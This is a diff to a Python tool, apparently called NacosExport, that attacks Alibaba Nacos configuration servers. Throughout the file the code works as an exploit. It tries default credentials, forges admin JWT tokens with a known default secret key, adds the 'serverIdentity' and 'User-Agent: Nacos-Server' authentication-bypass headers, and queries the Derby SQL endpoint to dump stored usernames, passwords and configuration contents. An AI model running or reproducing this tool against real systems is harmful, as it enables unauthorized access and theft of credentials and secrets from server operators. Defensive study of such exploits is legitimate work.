@@ -8,9 +8,11 @@ import jwt
 import base64
 import argparse
 import textwrap
+from colorama import Fore
 
 
-VERSION = "v1.4.1"
+
+VERSION = "v1.5.0"
 
 BANNER =  """
  ______________
@@ -25,10 +27,42 @@ BANNER =  """
 """.format(version=VERSION)
 
 
+def print_success(message: str, color: bool = True):
+    if color:
+        print(f"{Fore.GREEN}[+]{Fore.RESET} {message}")
+    else:
+        print(f"[+] {message}")
+
+def print_warning(message: str, color: bool = True):
+    if color:
+        print(f"{Fore.YELLOW}[!]{Fore.RESET} {message}")
+    else:
+        print(f"[!] {message}")
+
+def print_failure(message: str, color: bool = True):
+    if color:
+        print(f"{Fore.RED}[-]{Fore.RESET} {message}")
+    else:
+        print(f"[-] {message}")
+
+def print_info(message: str, color: bool = True):
+    if color:
+        print(f"{Fore.BLUE}[*]{Fore.RESET} {message}")
+    else:
+        print(f"[*] {message}")
+
+
 class NacosExport:
-    def __init__(self, target: str) -> None:
+    def __init__(self, target: str, colored: bool = True) -> None:
         self.target = target
-        self.token = ""
+
+        self.username = None
+        self.password = None
+        self.token = None
+        self.secretkey = None
+
+        self.verified = False
+
         self.proxies = dict()
         self.header = {
             'Accept': 'application/json, text/plain, */*',
@@ -38,36 +72,79 @@ class NacosExport:
         self.namespaces = list()
         self.count = 0
 
-    def login(self, username: str, password: str):
-        login_1 = "/v1/auth/users/login"
-        login_2 = "/v1/auth/login"
+        self.colored = colored
+        print_info(f"Target: {self.target}", self.colored)
 
-        login_params = {
-            'username': username,
-            'password': password,
-            'namespaceId': ''
-        }
+    def set_user_pass(self, username:str , password: str):
+        self.username = username
+        self.password = password
+        print_info(f"Set username: {self.username}", self.colored)
+        print_info(f"Set password: {self.password}", self.colored)
 
-        try:
-            resp = requests.post(self.target + login_1, headers=self.header, data=login_params, proxies=self.proxies, verify=False)
-            if resp.status_code == 200:
-                resp_json = resp.json()
-                self.token = resp_json.get("accessToken")
+    def set_secretkey(self, secretkey: str):
+        self.secretkey = secretkey
+        print_info(f"Set secretkey: {self.secretkey}", self.colored)
+
+    def set_token(self, token: str = None):
+        if self.username != None and self.password != None:
+            login_1 = "/v1/auth/users/login"
+            login_2 = "/v1/auth/login"
+
+            login_params = {
+                'username': self.username,
+                'password': self.password,
+                'namespaceId': ''
+            }
+
+            try:
+                resp = requests.post(self.target + login_1, headers=self.header, data=login_params, proxies=self.proxies, verify=False)
+                if resp.status_code == 200:
+                    resp_json = resp.json()
+                    token = resp_json.get("accessToken")
+                else:
+                    resp = requests.post(self.target + login_2, headers=self.header, data=login_params, proxies=self.proxies, verify=False)
+                    token = resp.headers.get("Authorization")
+            except Exception:
+                pass
+            if token == "":
+                print("[!] login failed.")
+                exit(0)
             else:
-                resp = requests.post(self.target + login_2, headers=self.header, data=login_params, proxies=self.proxies, verify=False)
-                self.token = resp.headers.get("Authorization")
-        except Exception:
-            pass
-        if self.token == "":
-            print("[!] login failed.")
-            exit(0)
-        else:
-            print("[+] Token: {}".format(self.token))
+                self.token = token
+                print_success(f"Set token: {self.token}", self.colored)
+                self.verified = True
 
-    def get_namespaces(self):
+        elif self.secretkey != None:
+            resp = requests.get(self.target , verify=False, proxies=self.proxies)
+            times = resp.headers['Date']
+            times = int(time.mktime(parsedate(times)))+18000
+            secret_key = base64.b64encode(self.secretkey.encode('utf-8')).decode('utf-8')
+            payload = {
+                "sub": "nacos",
+                "exp": times
+            }
+            self.token = jwt.encode(payload, secret_key, algorithm='HS256')
+            print_success(f"JWT token: {self.token}", self.colored)
+            self.verified = True
+
+        elif token != None:
+            self.token = token
+            print_info(f"Set token: {self.token}")
+            self.verified = True
+        
+        if self.verified:
+            self.header["Accesstoken"] = self.token
+            print_info(f"Set HTTP header (Accesstoken: {self.token})", self.colored)
+            self.header["Authorziation"] = self.token
+            print_info(f"Set HTTP header (Authorization: {self.token})", self.colored)
+        else:
+            self.header['serverIdentity'] = "security"
+            print_warning("Use bypass header (serverIdentity: security)", self.colored)
+            self.header['User-Agent'] = "Nacos-Server"
+            print_warning("Use bypass header (User-Agent: Nacos-Server)", self.colored)
+
+    def enum_namespaces(self):
         path = "/v1/console/namespaces"
-        if self.token != "":
-            self.header["Authorization"] = self.token
         params = {
             'namespaceId': '',
         }
@@ -76,8 +153,8 @@ class NacosExport:
             resp_dict = resp.json()
             self.namespaces = resp_dict['data']
 
-    def dump_auth(self):
-        self.get_namespaces()
+    def apidump(self):
+        self.enum_namespaces()
         for namespace in self.namespaces:
             if namespace["configCount"] == 0:
                 namespace["configCount"] = 1 
@@ -95,40 +172,9 @@ class NacosExport:
             self.header["Accesstoken"] = self.token
             PARAMS["accessToken"] = self.token
             if not self.request_contents(self.header, PARAMS):
-                print("[-] Token Invalid.")
-
-    def dump_unauth(self):
-        bypass_method = 1
-        self.get_namespaces()
-        for namespace in self.namespaces:
-            if namespace["configCount"] == 0:
-                namespace["configCount"] = 1 
-            PARAMS = {
-                "search": "accurate",
-                "dataId": "",
-                "group": "",
-                "appName": "",
-                "config_tags": "",
-                "pageNo": 1,
-                "pageSize": namespace["configCount"],
-                "tenant": namespace["namespace"],
-                "namespaceId": ""
-            }
-            # bypass
-            if bypass_method == 1:
-                if not self.request_contents(self.header, PARAMS):
-                    bypass_method = 2
-            if bypass_method == 2:
-                self.header['serverIdentity'] = "security"
-                if not self.request_contents(self.header, PARAMS):
-                    del self.header['serverIdentity']
-                    bypass_method = 3
-            if bypass_method == 3:
-                self.header['User-Agent'] = "Nacos-Server"
-                if not self.request_contents(self.header, PARAMS):
-                    print("[-] Cannot bypass")
-
-    def dump_sql(self):
+                print_failure("Token invalid.", self.colored)
+        
+    def sqldump(self):
         # dbs_query = "select * from sys.sysschemas"
         # users_query = "select * from nacos.users"
         # content_query = "select * from nacos.config_info"
@@ -138,7 +184,6 @@ class NacosExport:
         if resp.status_code == 200:
             resp_json = resp.json()
             if resp_json["code"] == 200:
-                print("[+] USERS:")
                 for user in resp_json["data"]:
                     print("Username:", user["USERNAME"])
                     print("Password:", user["PASSWORD"])
@@ -152,21 +197,6 @@ class NacosExport:
                     self.print_output("None", content["GROUP_ID"], content["DATA_ID"], content["CONTENT"])
                     self.count += 1
 
-    def set_token(self, token: str):
-        self.token = token
-
-    def gen_token(self, secretkey: str):
-        resp = requests.get(self.target , verify=False, proxies=self.proxies)
-        times = resp.headers['Date']
-        times = int(time.mktime(parsedate(times)))+18000
-        secret_key = base64.b64encode(secretkey.encode('utf-8')).decode('utf-8')
-        payload = {
-            "sub": "nacos",
-            "exp": times
-        }
-        self.token = jwt.encode(payload, secret_key, algorithm='HS256')
-        print("JWT TOKEN: ", self.token)
-
     def request_contents(self, header: dict, param:dict) -> bool:
         path = "/v1/cs/configs"
         resp = requests.get(self.target + path, headers=header, params=param, proxies=self.proxies, verify=False)
@@ -179,10 +209,14 @@ class NacosExport:
         else:
             return False
         
-    def set_proxy(self, url: str):  
-        protocol = url.split('://')[0]
-        self.proxies[protocol] = url
-
+    def check(self):
+        path = "/v1/cs/ops/derby?sql="
+        resp = requests.get(self.target + path, headers=self.header, proxies=self.proxies ,verify=False).json()
+        if resp["message"] == "The current storage mode is not Derby":
+            print_success("Not derby")
+        else:
+            print_success("It's derby")
+        
     def print_output(self, namespace: str, group:str, dataId: str, content: str):
         print("""
 
@@ -195,45 +229,51 @@ class NacosExport:
         print(content, "\n")
         self.count += 1
 
-def main():
+    def set_proxy(self, url: str):  
+        protocol = url.split('://')[0]
+        self.proxies[protocol] = url
+
+
+if __name__ == '__main__':
+
     parser = argparse.ArgumentParser(prog=sys.argv[0], formatter_class=argparse.RawDescriptionHelpFormatter,
     description=textwrap.dedent(BANNER))
-    parser.add_argument("url", type=str, help="NACOS url, before '/v1'")
-    parser.add_argument("method", type=str, help="Choice method, {login, bypass|unauth, sql, token, secretkey}")
-    parser.add_argument("-u", "--username", type=str, help="NACOS username", default="nacos")
-    parser.add_argument("-p", "--password", type=str, help="NACOS password", default="nacos")
-    parser.add_argument("-t", "--token", type=str, help="token", default="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g")
-    parser.add_argument("-sk", "--secretkey", type=str, help="secretkey", default="SecretKey012345678901234567890123456789012345678901234567890123456789")
-    parser.add_argument("--proxy", type=str, help="proxy like: http://127.0.0.1:8080")
+
+    parser.add_argument("-u", "--url", required=True, type=str, help="NACOS url, before '/v1'")
+    parser.add_argument("-U", "--username", type=str, help="NACOS username, default: nacos")
+    parser.add_argument("-P", "--password", type=str, help="NACOS password, default: nacos")
+    parser.add_argument("-T", "--token", type=str, help="token, default: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g")
+    parser.add_argument("-S", "--secretkey", type=str, help="secretkey, default: SecretKey012345678901234567890123456789012345678901234567890123456789")
+    parser.add_argument("--proxy", type=str, help="set proxy, example: http://127.0.0.1:8080")
+    parser.add_argument("--check-derby", action='store_true', help="Check standalone mode")
+    parser.add_argument("--apidump", action='store_true', help="extract NACOS config")
+    parser.add_argument("--sqldump", action='store_true', help="extract NACOS config from Derby database")
+
+    parser.add_argument("--no-color", action='store_false', help="Print without Color", )
+
     args = parser.parse_args()
 
 
     target = args.url.rstrip('/')
-    print("[+] Target:", target)
-    nacos = NacosExport(target=target)
+    print_info(f"Command: {' '.join(sys.argv)}", args.no_color)
+    nacos = NacosExport(target, args.no_color)
+
     if args.proxy != None:
         nacos.set_proxy(args.proxy)
-    if args.method == "secretkey":
-        print("[+] SecertKey:", args.secretkey)
-        nacos.gen_token(args.secretkey)
-        nacos.dump_auth()
-    if args.method == "login":
-        print("[+] Username:", args.username)
-        print("[+] Password:", args.password)
-        nacos.login(args.username, args.password)
-        nacos.dump_auth()
-    if args.method == "bypass" or args.method == "unauth":
-        print("[*] Bypass/Unauth")
-        nacos.dump_unauth()
-    if args.method == "sql":
-        nacos.dump_sql()
-    if args.method == "token":
-        print("[+] Token:", args.token)
+    if args.username != None and args.password != None:
+        nacos.set_user_pass(args.username, args.password)
+    if args.token != None:
         nacos.set_token(args.token)
-        nacos.dump_auth()
+    if args.secretkey != None:
+        nacos.set_secretkey(args.secretkey)
 
-    print("[+] Count: ", nacos.count)
+    nacos.set_token()
+    
+    if args.apidump:
+        nacos.apidump()
+    if args.sqldump:
+        nacos.sqldump()
+    if args.check_derby:
+        nacos.check()
 
-
-if __name__ == '__main__':
-    main()
+    print_success(f"Count: {nacos.count}", args.no_color)
